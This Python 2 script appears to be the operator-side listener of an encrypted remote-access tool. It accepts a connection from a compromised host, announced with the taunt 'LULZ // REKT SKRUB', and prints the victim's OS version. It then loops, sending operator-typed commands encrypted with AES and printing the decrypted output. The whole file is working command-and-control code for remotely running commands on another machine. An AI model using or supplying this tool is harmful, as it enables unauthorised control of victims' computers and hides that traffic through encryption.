import socket, os, time, errno, base64               # Import socket module
from Crypto.Cipher import AES # encryption library
# import winsound (ONLY WORKS ON WINDOWS!)

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

cipher = AES.new('AES KEY PLEASE CHANGE ME!!')


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '127.0.0.1'    
port = 6           


s.bind((host, port))     
print "[*] SERVER RUNNING ON " + host 
def YTR():
	os.system("cls")
	print "[*] SERVER RUNNING ON " + host 
	s.listen(20) 
	c, addr = s.accept()  
	# winsound.PlaySound("SystemExit", winsound.SND_ALIAS)      !UNCOMMENT IF YOU'RE RUNNING WINDOWS AND WANT NOTIFICATION SOUND!
	print ""
	print ' LULZ // REKT SKRUB: ', addr    

	version = c.recv(1024)
	ver = DecodeAES(cipher, version)
	print ""
	print "[!] OS VERSION ON REMOTE HOST: " + ver
	print ""

	while 1:
		c.settimeout(2)
		try:
			cmd = raw_input("CMD:")
			print ""
			print " [#] SENDING DATA [" + cmd + "]"
			print ""
			encoded = EncodeAES(cipher, cmd)
			c.send(encoded)
			r = c.recv(16384)
			decoded = DecodeAES(cipher, r)
			print decoded
		except:
			print ""
			print " [X] CLIENT DISCONNECTED"
			YTR()
YTR()

#while 1: 
	



